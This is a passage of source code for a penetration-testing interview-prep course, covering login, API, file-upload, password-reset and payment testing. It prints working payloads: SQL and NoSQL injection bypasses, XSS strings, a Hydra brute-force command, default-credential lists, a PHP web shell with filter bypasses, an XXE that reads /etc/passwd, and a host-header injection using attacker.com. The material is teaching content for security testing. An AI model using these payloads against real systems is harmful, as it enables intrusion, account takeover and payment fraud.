<span class="comment"># If response takes 5 seconds → SQLi confirmed!</span>

<span class="comment"># How to detect success:</span>
<span class="comment"># - Different response length (login success vs failure)</span>
<span class="comment"># - Different HTTP status code (302 redirect vs 200)</span>
<span class="comment"># - Different response content ("Welcome" vs "Invalid")</span>
<span class="comment"># - Time delay (blind SQLi)</span>`)}

    <h4>3.2 — Brute Force Attack</h4>
    ${terminal('Brute Force Testing', `<span class="comment"># Step 1: Check if rate limiting exists</span>
<span class="comment"># Try 10-20 rapid login attempts with wrong password</span>
<span class="comment"># If all succeed without blocking → NO rate limiting! (vulnerability)</span>

<span class="comment"># Step 2: Use Burp Intruder</span>
<span class="comment"># 1. Send login request to Intruder</span>
<span class="comment"># 2. Set password field as payload position</span>
<span class="comment"># 3. Load a password wordlist</span>
<span class="comment"># 4. Start attack</span>
<span class="comment"># 5. Look for different response length/status = correct password</span>

<span class="comment"># Or use Hydra from terminal:</span>
<span class="cmd">hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"</span>

<span class="comment"># Check for account lockout:</span>
<span class="comment"># After 5, 10, 20 failed attempts — does account lock?</span>
<span class="comment"># If no lockout → vulnerability!</span>`)}

    <h4>3.3 — Default Credentials</h4>
    ${terminal('Default Credentials', `<span class="comment"># Try common default combinations:</span>
<span class="warning">admin / admin</span>
<span class="warning">admin / password</span>
<span class="warning">admin / admin123</span>
<span class="warning">admin / 123456</span>
<span class="warning">test / test</span>
<span class="warning">root / root</span>
<span class="warning">administrator / administrator</span>
<span class="warning">user / user</span>
<span class="warning">guest / guest</span>`)}

    <h4>3.4 — Username Enumeration</h4>
    <p><em>"Check if the app reveals whether a username exists."</em></p>
    <ul>
      <li>Enter valid username + wrong password → Note the error message</li>
      <li>Enter invalid username + wrong password → Note the error message</li>
      <li>If messages differ: <code>"Invalid password"</code> vs <code>"User not found"</code> → <strong>Username Enumeration vulnerability!</strong></li>
      <li>Also check: response time difference, response length difference, HTTP status code difference</li>
      <li><strong>Secure:</strong> "Invalid username or password" (same message for both)</li>
    </ul>

    <h3>📝 Phase 4: Input Validation Testing</h3>

    <h4>4.1 — XSS (Cross-Site Scripting)</h4>
    ${terminal('XSS on Login', `<span class="comment"># Try in username and password fields:</span>
<span class="warning">&lt;script&gt;alert('XSS')&lt;/script&gt;</span>
<span class="warning">&lt;img src=x onerror=alert(1)&gt;</span>
<span class="warning">"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span>
<span class="warning">&lt;svg onload=alert(1)&gt;</span>
<span class="warning">javascript:alert(1)</span>

<span class="comment"># Check if the input is reflected in:</span>
<span class="comment"># - Error message: "User &lt;script&gt;alert(1)&lt;/script&gt; not found"</span>
<span class="comment"># - URL parameter: /login?error=&lt;script&gt;alert(1)&lt;/script&gt;</span>
<span class="comment"># If script executes → Reflected XSS!</span>`)}

    <h4>4.2 — NoSQL Injection (if MongoDB)</h4>
    ${terminal('NoSQL on Login', `<span class="comment"># If Content-Type is application/json, try:</span>
<span class="warning">{"username": "admin", "password": {"$ne": ""}}</span>
<span class="warning">{"username": {"$gt": ""}, "password": {"$gt": ""}}</span>
<span class="warning">{"username": "admin", "password": {"$regex": ".*"}}</span>`)}

    <h3>🍪 Phase 5: Session Management Testing</h3>
    <table class="comparison-table">
      <tr><th>Test</th><th>How</th><th>Expected Secure Behavior</th></tr>
      <tr><td>Session token after login</td><td>Compare cookie before and after login</td><td>Session ID should CHANGE after login (prevents session fixation)</td></tr>
      <tr><td>Cookie flags</td><td>Check Set-Cookie header in response</td><td>Should have HttpOnly, Secure, SameSite flags</td></tr>
      <tr><td>Session on logout</td><td>Copy session token, logout, replay token</td><td>Session should be invalidated — replaying should fail</td></tr>
      <tr><td>Session timeout</td><td>Login, wait idle, try to use session</td><td>Session should expire after reasonable time</td></tr>
      <tr><td>Concurrent sessions</td><td>Login from two browsers simultaneously</td><td>Depends on policy — check if previous sessions are killed</td></tr>
      <tr><td>Token randomness</td><td>Collect multiple tokens, check for patterns</td><td>Tokens should be random, not sequential</td></tr>
    </table>

    <h3>🛡️ Phase 6: Security Headers & CSRF</h3>
    <ul>
      <li><strong>CSRF Token:</strong> Is there an anti-CSRF token in the form? Can you remove it and still login? (If yes → CSRF vulnerability)</li>
      <li><strong>X-Frame-Options:</strong> Missing? Then clickjacking is possible on login page</li>
      <li><strong>Content-Security-Policy:</strong> Missing? XSS protection is weakened</li>
      <li><strong>Strict-Transport-Security:</strong> Missing? HTTPS downgrade attack possible</li>
    </ul>

    <h3>🧠 Phase 7: Business Logic Testing</h3>
    <ul>
      <li><strong>Password policy:</strong> Does it accept <code>123</code> as password? (No minimum length/complexity)</li>
      <li><strong>Case sensitivity:</strong> Is <code>Admin</code> same as <code>admin</code>? Can you create duplicate users?</li>
      <li><strong>Empty fields:</strong> What happens if you submit empty username/password?</li>
      <li><strong>Long input:</strong> What happens with 10,000 character username? (Buffer overflow/DoS)</li>
      <li><strong>Special characters:</strong> <code>admin@#$%</code> — do they cause errors revealing info?</li>
      <li><strong>Remember me:</strong> If there's a "remember me" checkbox, what token does it set? Is it a persistent session? Can it be stolen?</li>
      <li><strong>Forgot password link:</strong> Does it reveal if username/email exists?</li>
    </ul>

    <h3>📋 Phase 8: Summary Checklist</h3>
    <table class="comparison-table">
      <tr><th>#</th><th>Test</th><th>Tool</th><th>Finding if Vulnerable</th></tr>
      <tr><td>1</td><td>HTTPS check</td><td>Browser/curl</td><td>Credentials in plaintext</td></tr>
      <tr><td>2</td><td>SQL Injection</td><td>Burp Repeater</td><td>Auth bypass, data leak</td></tr>
      <tr><td>3</td><td>XSS</td><td>Burp Repeater</td><td>Session hijacking</td></tr>
      <tr><td>4</td><td>Brute Force</td><td>Burp Intruder / Hydra</td><td>Account compromise</td></tr>
      <tr><td>5</td><td>Default Creds</td><td>Manual</td><td>Instant access</td></tr>
      <tr><td>6</td><td>Username Enumeration</td><td>Burp Intruder</td><td>Valid user discovery</td></tr>
      <tr><td>7</td><td>Session Management</td><td>Burp</td><td>Session hijacking/fixation</td></tr>
      <tr><td>8</td><td>Cookie Flags</td><td>Browser DevTools</td><td>Cookie theft via XSS</td></tr>
      <tr><td>9</td><td>CSRF Token</td><td>Burp Repeater</td><td>CSRF attack possible</td></tr>
      <tr><td>10</td><td>Security Headers</td><td>curl -I</td><td>Clickjacking, MITM</td></tr>
      <tr><td>11</td><td>Rate Limiting</td><td>Burp Intruder</td><td>Unlimited brute force</td></tr>
      <tr><td>12</td><td>Account Lockout</td><td>Manual/Intruder</td><td>No lockout protection</td></tr>
      <tr><td>13</td><td>Password Policy</td><td>Manual</td><td>Weak passwords accepted</td></tr>
      <tr><td>14</td><td>Error Messages</td><td>Manual</td><td>Info disclosure</td></tr>
      <tr><td>15</td><td>Forgot Password</td><td>Burp</td><td>User enum, token issues</td></tr>
    </table>

    ${conceptCard('danger', '🎯 Perfect Interview Answer Structure', `<p>When asked "How would you test a login page with black box testing?", say:</p>
      <p><strong>"I would approach it in phases:</strong></p>
      <p><strong>First, Reconnaissance</strong> — I observe the page source, check HTTPS, identify the tech stack from headers and cookies, and look for hidden directories.</p>
      <p><strong>Second, I set up Burp Suite</strong> as a proxy to intercept the login request. I note the parameters, content type, and any tokens.</p>
      <p><strong>Third, Authentication Testing</strong> — I test for SQL injection using payloads like <code>admin' OR 1=1 --</code>, try default credentials, and check for brute force by testing if there's rate limiting or account lockout. I also check for username enumeration through different error messages.</p>
      <p><strong>Fourth, Input Validation</strong> — I test for XSS in both fields and check if special characters cause information disclosure.</p>
      <p><strong>Fifth, Session Management</strong> — I verify if the session ID regenerates after login, check cookie flags (HttpOnly, Secure, SameSite), test if logout actually invalidates the session, and check for session timeout.</p>
      <p><strong>Sixth, Security Headers</strong> — I check for CSRF protection, X-Frame-Options, CSP, and HSTS.</p>
      <p><strong>Finally, Business Logic</strong> — I test password policy, forgot password functionality, remember me feature, and concurrent sessions."</p>
    `)}
  </div>`;
}


// ============ FIX: Properly override Module 9 content ============
// The previous string replacement approaches failed because template literals
// are already evaluated. This direct override replaces the content function.

MODULES.find(m => m.id === 'mod9').content = function() {
  // Get the base Module 9 content (from the original renderModule9 before any overrides)
  // We'll just call the base function and append the extra content before the footer
  const baseContent = (function() {
    // This is the original module 9 Q&A bank content
    return renderModule9();
  })();

  // Find the last </div> before the module footer buttons and inject extra content
  const footerHTML = moduleFooter('mod9', 'mod8', null);

  // Build the complete content: original Q&A + Black Box Scenario + Extra Scenarios + Footer
  // Remove any existing footer from base content
  let content = baseContent;

  // Since replacement might not work, let's just rebuild the module
  return `
  <div class="module-header fade-in">
    <div class="module-tag">Module 10 · 3 hrs</div>
    <h1>🎯 Interview Q&A Bank</h1>
    <p class="module-desc">100+ real interview questions with detailed answers covering all topics. Organized by category. Click each question to reveal the answer.</p>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🔐</span> Cybersecurity Basics</h2>
    ${qa(1, 'What is cybersecurity?', 'Cybersecurity is the practice of protecting systems, networks, data, and programs from digital attacks, unauthorized access, damage, or theft. It involves implementing technologies, processes, and controls to safeguard digital assets and ensure the confidentiality, integrity, and availability (CIA) of information.')}
    ${qa(2, 'Explain the CIA Triad.', '<strong>Confidentiality:</strong> Ensuring data is accessible only to authorized users (encryption, access controls).<br><strong>Integrity:</strong> Ensuring data is accurate and unmodified (hashing, digital signatures, checksums).<br><strong>Availability:</strong> Ensuring systems and data are accessible when needed (backups, redundancy, DDoS protection).<br>Every security measure maps to one or more of these three pillars.')}
    ${qa(3, 'What is the difference between Authentication and Authorization?', '<strong>Authentication (AuthN)</strong> verifies WHO you are — "Are you really Vaibhav?" Done via passwords, biometrics, OTP, certificates.<br><strong>Authorization (AuthZ)</strong> verifies WHAT you can do — "Does Vaibhav have admin access?" Done via roles, permissions, ACLs.<br>Authentication always comes FIRST. HTTP 401 = not authenticated. HTTP 403 = authenticated but not authorized.')}
    ${qa(4, 'What is the difference between a Vulnerability, Threat, Exploit, and Risk?', '<strong>Vulnerability:</strong> A weakness in a system (e.g., unpatched software, SQL injection flaw).<br><strong>Threat:</strong> A potential cause of harm (e.g., hacker, malware, insider).<br><strong>Exploit:</strong> Code or method that takes advantage of a vulnerability.<br><strong>Risk:</strong> The likelihood and impact of a threat exploiting a vulnerability.<br>Formula: <code>Risk = Threat × Vulnerability × Impact</code>')}
    ${qa(5, 'Difference between Hashing and Encryption?', '<strong>Hashing:</strong> One-way function, cannot be reversed. Fixed-length output. Used for integrity verification and password storage. Examples: MD5, SHA-256, bcrypt.<br><strong>Encryption:</strong> Two-way function, can be reversed with a key. Used for data confidentiality. Types: Symmetric (AES — same key) and Asymmetric (RSA — public/private key pair).')}
    ${qa(6, 'What is Multi-Factor Authentication (MFA)?', 'MFA requires two or more verification factors from different categories:<br>1. <strong>Something you know</strong> — password, PIN<br>2. <strong>Something you have</strong> — phone (OTP), hardware token<br>3. <strong>Something you are</strong> — fingerprint, face recognition<br>Using two passwords is NOT MFA. True MFA uses factors from different categories.')}
  </div>

  ${renderBlackBoxLogin()}
  ${renderExtraScenarios()}

  ${keyPoints([
    'For every attack question: explain What → How → Harm → Prevention',
    'Login page testing: SQLi, brute force, XSS, default creds, session mgmt, enumeration',
    'Know Burp Suite workflow: Intercept → Repeater → Intruder',
    'VAPT phases: Plan → Recon → Scan → Exploit → Report',
    'Always mention prevention/remediation — shows you think like a defender too',
    'Black box login testing: Recon → Intercept → Auth Testing → Input Validation → Session → Business Logic'
  ])}

  ${moduleFooter('mod9', 'mod8', null)}`;
};


// ============ MULTIPLE SCENARIO WALKTHROUGHS ============
// Add a dedicated new module for scenario-based interview prep

MODULES.push({
  id: 'mod_scenarios',
  title: 'Scenario Walkthroughs',
  icon: '🧪',
  time: '3 hrs',
  desc: 'Step-by-step walkthroughs for common interview scenarios: e-commerce, API, file upload, payment gateway, and more.',
  content: () => renderScenarios()
});

function renderScenarios() {
  return `
  <div class="module-header fade-in">
    <div class="module-tag">Module 11 · 3 hrs</div>
    <h1>🧪 Scenario-Based Interview Walkthroughs</h1>
    <p class="module-desc">These are the exact types of questions Kratikal asks in interviews. For each scenario, you get a complete step-by-step approach with tools, payloads, and what to report.</p>
  </div>

  <!-- SCENARIO 1: E-COMMERCE WEBSITE -->
  <div class="topic-section">
    <h2><span class="section-icon">🛒</span> Scenario 1: You are given an E-Commerce Website to pentest (Black Box)</h2>
    <p><em>"We have an online store. Test it for security vulnerabilities."</em></p>

    ${conceptCard('highlight', '💡 Approach Framework', '<p>For ANY black box test, always follow: <strong>Recon → Map → Test Authentication → Test Authorization → Test Input → Test Business Logic → Test Session → Report</strong></p>')}

    <h3>Step 1: Reconnaissance</h3>
    ${terminal('E-Commerce Recon', `<span class="comment"># Discover tech stack</span>
<span class="cmd">curl -I https://shop.target.com</span>
<span class="comment"># Look for: Server, X-Powered-By, Set-Cookie names</span>

<span class="comment"># Directory discovery</span>
<span class="cmd">gobuster dir -u https://shop.target.com -w common.txt</span>
<span class="comment"># Looking for: /admin, /backup, /api, /uploads, /config</span>

<span class="comment"># Subdomain discovery</span>
<span class="cmd">nmap -sV -p 80,443,8080 shop.target.com</span>`)}

    <h3>Step 2: Map the Application</h3>
    <ul>
      <li>Browse entire site through Burp Proxy — let Spider/Crawler map all pages</li>
      <li>Identify all user roles: Guest, Registered User, Admin</li>
      <li>Identify all input points: Search, Product reviews, Contact form, Profile update, Checkout</li>
      <li>Identify all file uploads: Profile picture, Product reviews with images</li>
      <li>Note all API endpoints captured in Burp HTTP History</li>
    </ul>

    <h3>Step 3: Test Each Feature</h3>
    <table class="comparison-table">
      <tr><th>Feature</th><th>Vulnerabilities to Test</th><th>Example Payload</th></tr>
      <tr><td><strong>Search bar</strong></td><td>Reflected XSS, SQLi, SSTI</td><td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, <code>' OR 1=1--</code>, <code>{{7*7}}</code></td></tr>
      <tr><td><strong>Product reviews</strong></td><td>Stored XSS (affects ALL users)</td><td><code>&lt;img src=x onerror=alert(document.cookie)&gt;</code></td></tr>
      <tr><td><strong>Product ID in URL</strong></td><td>SQLi, IDOR</td><td><code>/product?id=1' UNION SELECT 1,2,3--</code></td></tr>
      <tr><td><strong>Add to cart</strong></td><td>Price manipulation, quantity manipulation</td><td>Change <code>price=5000</code> to <code>price=1</code> in request</td></tr>
      <tr><td><strong>Coupon/discount</strong></td><td>Race condition, coupon reuse</td><td>Apply same coupon 100x simultaneously</td></tr>
      <tr><td><strong>Checkout</strong></td><td>Workflow bypass, payment tampering</td><td>Skip payment → jump to order confirmation URL</td></tr>
      <tr><td><strong>User profile</strong></td><td>IDOR, Self-XSS, file upload</td><td>Change <code>user_id=101</code> to <code>user_id=102</code></td></tr>
      <tr><td><strong>Order history</strong></td><td>IDOR (view other user's orders)</td><td><code>/orders/1001</code> → <code>/orders/1002</code></td></tr>
      <tr><td><strong>Address field</strong></td><td>Stored XSS (reflected in invoices/emails)</td><td>XSS in address line shown in delivery email</td></tr>
    </table>

    <h3>Step 4: Business Logic Attacks (Critical for E-Commerce!)</h3>
    ${terminal('Business Logic Tests', `<span class="comment"># 1. NEGATIVE QUANTITY</span>
<span class="warning">POST /cart/add</span>
<span class="warning">product_id=1&quantity=-5&price=500</span>
<span class="comment"># Result: Cart total becomes negative = money credited!</span>

<span class="comment"># 2. PRICE MANIPULATION</span>
<span class="warning">POST /cart/add</span>
<span class="warning">product_id=1&quantity=1&price=0.01</span>
<span class="comment"># Intercept with Burp, change price parameter</span>

<span class="comment"># 3. COUPON RACE CONDITION</span>
<span class="comment"># Send 50 simultaneous requests with same coupon code</span>
<span class="comment"># If all succeed → coupon applied 50 times!</span>

<span class="comment"># 4. WORKFLOW BYPASS</span>
<span class="comment"># Normal: Cart → Address → Payment → Confirmation</span>
<span class="comment"># Attack: Cart → Skip directly to Confirmation URL</span>
<span class="comment"># If order is placed without payment → critical bug!</span>

<span class="comment"># 5. CURRENCY/COUNTRY MANIPULATION</span>
<span class="warning">POST /cart/checkout</span>
<span class="warning">currency=INR changed to currency=IRR (Iranian Rial)</span>
<span class="comment"># 1 INR ≈ 500 IRR → pay less!</span>`)}

    ${conceptCard('danger', '🎯 Interview Answer', '<p>"For an e-commerce site, I would focus heavily on <strong>business logic vulnerabilities</strong> because automated scanners miss these entirely. I would test price manipulation, negative quantities, coupon race conditions, payment workflow bypass, and IDOR on order history. These are critical financial risks. I would also test the standard OWASP Top 10 on every input field."</p>')}
  </div>

  <!-- SCENARIO 2: REST API -->
  <div class="topic-section">
    <h2><span class="section-icon">🔌</span> Scenario 2: You are given a REST API to test</h2>
    <p><em>"Here is our API documentation. Test the API for vulnerabilities."</em></p>

    <h3>Step 1: Understand the API</h3>
    <ul>
      <li>Review API documentation (Swagger/OpenAPI if available)</li>
      <li>Identify all endpoints, HTTP methods, and parameters</li>
      <li>Understand authentication mechanism (API Key, JWT, OAuth)</li>
      <li>Map all user roles and their permissions</li>
    </ul>

    <h3>Step 2: Test Authentication</h3>
    ${terminal('API Auth Testing', `<span class="comment"># 1. Access without authentication</span>
<span class="cmd">curl https://api.target.com/users</span>
<span class="comment"># If data returned → Broken Authentication!</span>

<span class="comment"># 2. Access with expired/invalid token</span>
<span class="cmd">curl -H "Authorization: Bearer INVALID_TOKEN" https://api.target.com/users</span>

<span class="comment"># 3. JWT Manipulation</span>
<span class="comment"># Decode JWT at jwt.io</span>
<span class="comment"># Change payload: {"role":"user"} → {"role":"admin"}</span>
<span class="comment"># Try alg:none attack</span>

<span class="comment"># 4. Token in URL (bad practice)</span>
<span class="cmd">GET /api/data?token=abc123</span>
<span class="comment"># Token visible in logs, browser history, Referer header</span>`)}

    <h3>Step 3: Test Authorization (IDOR)</h3>
    ${terminal('API IDOR Testing', `<span class="comment"># User A is logged in (token for user ID 101)</span>

<span class="comment"># Test Horizontal IDOR:</span>
<span class="cmd">GET /api/users/101/profile</span>     <span class="comment"># Own profile ✓</span>
<span class="warning">GET /api/users/102/profile</span>     <span class="comment"># Other user? IDOR!</span>
<span class="warning">GET /api/users/101/orders</span>      <span class="comment"># Own orders ✓</span>
<span class="warning">GET /api/users/102/orders</span>      <span class="comment"># Other user's orders? IDOR!</span>

<span class="comment"># Test Vertical IDOR:</span>
<span class="warning">GET /api/admin/dashboard</span>       <span class="comment"># Admin-only? Accessible to normal user?</span>
<span class="warning">DELETE /api/users/102</span>          <span class="comment"># Can normal user delete other users?</span>
<span class="warning">PUT /api/users/101/role</span>        <span class="comment"># Can user change their own role to admin?</span>
<span class="warning">{"role": "admin"}</span>

<span class="comment"># Test with different HTTP methods:</span>
<span class="warning">GET /api/users</span>   <span class="comment"># Allowed?</span>
<span class="warning">PUT /api/users/101</span>  <span class="comment"># Can modify?</span>
<span class="warning">DELETE /api/users/101</span>  <span class="comment"># Can delete?</span>
<span class="warning">PATCH /api/users/101</span>  <span class="comment"># Partial update?</span>`)}

    <h3>Step 4: Test Input Validation</h3>
    ${terminal('API Input Testing', `<span class="comment"># SQL Injection on parameters:</span>
<span class="warning">GET /api/products?category=electronics' OR 1=1--</span>

<span class="comment"># NoSQL Injection (if MongoDB):</span>
<span class="warning">POST /api/login</span>
<span class="warning">{"username": "admin", "password": {"$ne": ""}}</span>

<span class="comment"># Mass Assignment — send extra parameters:</span>
<span class="warning">POST /api/register</span>
<span class="warning">{"username":"hacker","password":"pass","role":"admin","isVerified":true}</span>
<span class="comment"># If the API blindly accepts extra fields → privilege escalation!</span>

<span class="comment"># Rate Limiting:</span>
<span class="comment"># Send 1000 requests in 10 seconds</span>
<span class="comment"># If all succeed → no rate limiting → brute force possible</span>

<span class="comment"># Excessive Data Exposure:</span>
<span class="comment"># Does GET /api/users/101 return password hash, internal IDs,</span>
<span class="comment"># or other sensitive fields not needed by the client?</span>`)}

    ${conceptCard('danger', '🎯 Interview Answer', '<p>"For API testing, my primary focus would be on <strong>authentication/authorization (IDOR), input validation, and mass assignment</strong>. I would test every endpoint with different user roles, try accessing other users\' data by changing IDs, check if JWT can be manipulated, test for injection on all parameters, and verify rate limiting. I use Burp Suite and Postman for this."</p>')}
  </div>

  <!-- SCENARIO 3: FILE UPLOAD -->
  <div class="topic-section">
    <h2><span class="section-icon">📤</span> Scenario 3: You find a File Upload feature. How do you test it?</h2>
    <p><em>"The application allows users to upload profile pictures/documents."</em></p>

    <h3>Step-by-Step Testing</h3>
    ${terminal('File Upload Testing', `<span class="comment"># STEP 1: Test basic upload with a PHP web shell</span>
<span class="comment"># Create shell.php:</span>
<span class="warning">&lt;?php system($_GET['cmd']); ?&gt;</span>
<span class="cmd">Upload shell.php</span>
<span class="comment"># If accepted → CRITICAL! Navigate to /uploads/shell.php?cmd=whoami</span>

<span class="comment"># STEP 2: Bypass extension blacklist</span>
<span class="warning">shell.php → shell.pHp</span>          <span class="comment"># Case variation</span>
<span class="warning">shell.php → shell.php5</span>         <span class="comment"># Alternative extension</span>
<span class="warning">shell.php → shell.php.jpg</span>      <span class="comment"># Double extension</span>
<span class="warning">shell.php → shell.php%00.jpg</span>   <span class="comment"># Null byte</span>
<span class="warning">shell.php → shell.phtml</span>        <span class="comment"># Alternative PHP extension</span>
<span class="warning">shell.php → shell.php::$DATA</span>   <span class="comment"># Windows ADS</span>

<span class="comment"># STEP 3: Bypass Content-Type check</span>
<span class="comment"># In Burp, change Content-Type header:</span>
<span class="warning">Content-Type: application/x-php → Content-Type: image/jpeg</span>

<span class="comment"># STEP 4: Bypass magic bytes check</span>
<span class="comment"># Add JPEG header before PHP code:</span>
<span class="warning">\\xFF\\xD8\\xFF\\xE0 &lt;?php system($_GET['cmd']); ?&gt;</span>

<span class="comment"># STEP 5: Upload SVG with XSS</span>
<span class="warning">&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
  &lt;script&gt;alert(document.cookie)&lt;/script&gt;
&lt;/svg&gt;</span>

<span class="comment"># STEP 6: Upload SVG with XXE</span>
<span class="warning">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
&lt;svg&gt;&lt;text&gt;&xxe;&lt;/text&gt;&lt;/svg&gt;</span>

<span class="comment"># STEP 7: Path traversal in filename</span>
<span class="warning">Filename: ../../../etc/cron.d/malicious</span>

<span class="comment"># STEP 8: DoS via large file</span>
<span class="comment"># Upload a 10GB file — does the server crash?</span>
<span class="comment"># Upload 10,000 small files — storage exhaustion?</span>

<span class="comment"># STEP 9: Check where files are stored</span>
<span class="comment"># Are they in webroot? (accessible via browser = dangerous)</span>
<span class="comment"># Or on CDN/S3? (safer)</span>`)}

    ${conceptCard('danger', '🎯 Interview Answer', '<p>"For file upload testing, I follow a systematic approach: first try uploading a web shell directly, then bypass extension filters (case changes, double extensions, null bytes), then bypass content-type validation by modifying headers in Burp, then try magic byte injection. I also test SVG uploads for XSS and XXE. Finally, I check if uploaded files are stored in the webroot and accessible directly — that\'s when it becomes RCE."</p>')}
  </div>

  <!-- SCENARIO 4: FORGOT PASSWORD -->
  <div class="topic-section">
    <h2><span class="section-icon">🔑</span> Scenario 4: Test a "Forgot Password" Feature</h2>
    <p><em>"The application has a forgot password / reset password feature."</em></p>

    <h3>Complete Testing Checklist</h3>
    <table class="comparison-table">
      <tr><th>#</th><th>Test</th><th>What to Check</th><th>Vulnerability If Failed</th></tr>
      <tr><td>1</td><td><strong>User Enumeration</strong></td><td>Enter valid email → "Reset link sent." Enter invalid email → "Email not found."</td><td>Attacker can discover valid accounts</td></tr>
      <tr><td>2</td><td><strong>Token Randomness</strong></td><td>Request 10 reset tokens. Are they random or predictable/sequential?</td><td>Predictable tokens → account takeover</td></tr>
      <tr><td>3</td><td><strong>Token Length</strong></td><td>Is the token short enough to brute-force? (e.g., 4 digits)</td><td>Brute force reset token</td></tr>
      <tr><td>4</td><td><strong>Token Expiry</strong></td><td>Use token after 24 hours. Still works?</td><td>Old tokens can be reused</td></tr>
      <tr><td>5</td><td><strong>Token Reuse</strong></td><td>Use same token twice. Still works?</td><td>One-time use not enforced</td></tr>
      <tr><td>6</td><td><strong>Rate Limiting</strong></td><td>Request 100 reset emails in 1 minute</td><td>Email bombing / DoS</td></tr>
      <tr><td>7</td><td><strong>Host Header Injection</strong></td><td>Change Host header to attacker.com. Does reset link go to attacker's domain?</td><td>Attacker receives reset link!</td></tr>
      <tr><td>8</td><td><strong>Token in URL</strong></td><td>Is reset token sent as URL parameter?</td><td>Token leaked in Referer header, logs</td></tr>
      <tr><td>9</td><td><strong>IDOR on Reset</strong></td><td>Can you change the email/user ID in the reset request?</td><td>Reset another user's password</td></tr>
      <tr><td>10</td><td><strong>Password Policy</strong></td><td>Can you set "123" as new password?</td><td>Weak passwords accepted</td></tr>
      <tr><td>11</td><td><strong>Old Password Invalidation</strong></td><td>After reset, does old password still work?</td><td>Multiple valid passwords</td></tr>
      <tr><td>12</td><td><strong>Session Invalidation</strong></td><td>After reset, are existing sessions terminated?</td><td>Attacker's session stays active</td></tr>
    </table>

    ${terminal('Host Header Injection Attack', `<span class="comment"># Normal reset request:</span>
<span class="cmd">POST /forgot-password HTTP/1.1</span>
<span class="highlight">Host: target.com</span>
email=victim@email.com

<span class="comment"># Attack — change Host header:</span>
<span class="cmd">POST /forgot-password HTTP/1.1</span>
<span class="warning">Host: attacker.com</span>
email=victim@email.com

<span class="comment"># If the reset email contains:</span>
<span class="comment"># https://attacker.com/reset?token=abc123</span>
<span class="comment"># Victim clicks it → token sent to attacker!</span>
<span class="comment"># Attacker uses token to reset victim's password → ACCOUNT TAKEOVER</span>`)}
  </div>

  <!-- SCENARIO 5: PAYMENT GATEWAY -->
  <div class="topic-section">
    <h2><span class="section-icon">💳</span> Scenario 5: Test a Payment Gateway Integration</h2>
    <p><em>"The application processes payments. Test the payment flow."</em></p>

    <h3>Testing Approach</h3>
    ${terminal('Payment Flow Testing', `<span class="comment"># STEP 1: Map the payment flow</span>
<span class="comment"># Typical: Select Plan → Enter Card → Process → Confirmation</span>
<span class="comment"># Intercept every request in Burp</span>

<span class="comment"># STEP 2: Price Manipulation</span>
<span class="comment"># Request: POST /api/payment</span>
<span class="warning">{"plan":"premium","amount":9999,"currency":"INR"}</span>
<span class="comment"># Change to:</span>
<span class="warning">{"plan":"premium","amount":1,"currency":"INR"}</span>
<span class="comment"># Or: {"plan":"premium","amount":-1,"currency":"INR"}</span>

<span class="comment"># STEP 3: Currency Manipulation</span>
<span class="warning">{"amount":100,"currency":"INR"} → {"amount":100,"currency":"IDR"}</span>
<span class="comment"># 100 INR ≈ ₹100 but 100 IDR ≈ ₹0.50</span>

<span class="comment"># STEP 4: Plan/Subscription Manipulation</span>
<span class="warning">{"plan_id":"basic"} → {"plan_id":"enterprise"}</span>
<span class="comment"># Pay for basic, get enterprise features</span>

<span class="comment"># STEP 5: Race Condition</span>
<span class="comment"># Send 10 simultaneous payment success callbacks</span>
<span class="comment"># Get 10x credit for 1 payment</span>

<span class="comment"># STEP 6: Replay Attack</span>
<span class="comment"># Capture successful payment callback</span>
<span class="comment"># Replay it multiple times → multiple credits</span>

<span class="comment"># STEP 7: Skip Payment</span>
<span class="comment"># Go from cart → directly to order confirmation URL</span>
<span class="comment"># Manipulate payment_status=pending → payment_status=success</span>

<span class="comment"># STEP 8: Callback Manipulation</span>
<span class="comment"># Payment gateways send callbacks to your server</span>
<span class="comment"># Can you forge a fake callback?</span>
<span class="comment"># Does the server verify callback signature?</span>`)}

    ${conceptCard('danger', '🎯 Key Checks', '<ul><li>Server should NEVER trust client-side price/amount</li><li>Always verify payment amount server-side against the order</li><li>Validate payment gateway callbacks with signature/hash</li><li>Use idempotency keys to prevent replay attacks</li><li>Price calculation must happen on the server, not client</li></ul>')}
  </div>

  <!-- SCENARIO 6: REGISTRATION/SIGNUP -->
  <div class="topic-section">
    <h2><span class="section-icon">📝</span> Scenario 6: Test a User Registration / Signup Page</h2>
    <p><em>"Test the signup flow for vulnerabilities."</em></p>

    <table class="comparison-table">
      <tr><th>#</th><th>Test</th><th>How</th><th>Impact</th></tr>
      <tr><td>1</td><td><strong>SQL Injection</strong></td><td>Try SQLi payloads in all fields (name, email, phone)</td><td>Database manipulation</td></tr>
      <tr><td>2</td><td><strong>XSS</strong></td><td>Enter <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> in name field</td><td>Stored XSS if name is displayed to other users/admins</td></tr>
      <tr><td>3</td><td><strong>Weak Password Policy</strong></td><td>Try password: <code>1</code></td><td>Easy to brute force accounts</td></tr>
      <tr><td>4</td><td><strong>Duplicate Registration</strong></td><td>Register same email twice</td><td>Account confusion, takeover</td></tr>
      <tr><td>5</td><td><strong>Mass Assignment</strong></td><td>Add <code>"role":"admin"</code> to registration JSON body</td><td>Register as admin!</td></tr>
      <tr><td>6</td><td><strong>Email Enumeration</strong></td><td>"Email already exists" vs generic message</td><td>Discover valid accounts</td></tr>
      <tr><td>7</td><td><strong>Rate Limiting</strong></td><td>Register 1000 accounts rapidly</td><td>Spam accounts, resource exhaustion</td></tr>
      <tr><td>8</td><td><strong>Email Verification Bypass</strong></td><td>Can you access account before email verification?</td><td>Unverified account access</td></tr>
      <tr><td>9</td><td><strong>Phone/OTP Bypass</strong></td><td>Try OTP: 0000, 1234, 123456. Brute force 4-digit OTP.</td><td>OTP bypass</td></tr>
      <tr><td>10</td><td><strong>CAPTCHA Bypass</strong></td><td>Remove CAPTCHA parameter from request</td><td>Automated mass registration</td></tr>
    </table>
  </div>

  <!-- SCENARIO 7: ADMIN PANEL -->
  <div class="topic-section">
    <h2><span class="section-icon">⚙️</span> Scenario 7: You discover a hidden Admin Panel. How do you test it?</h2>
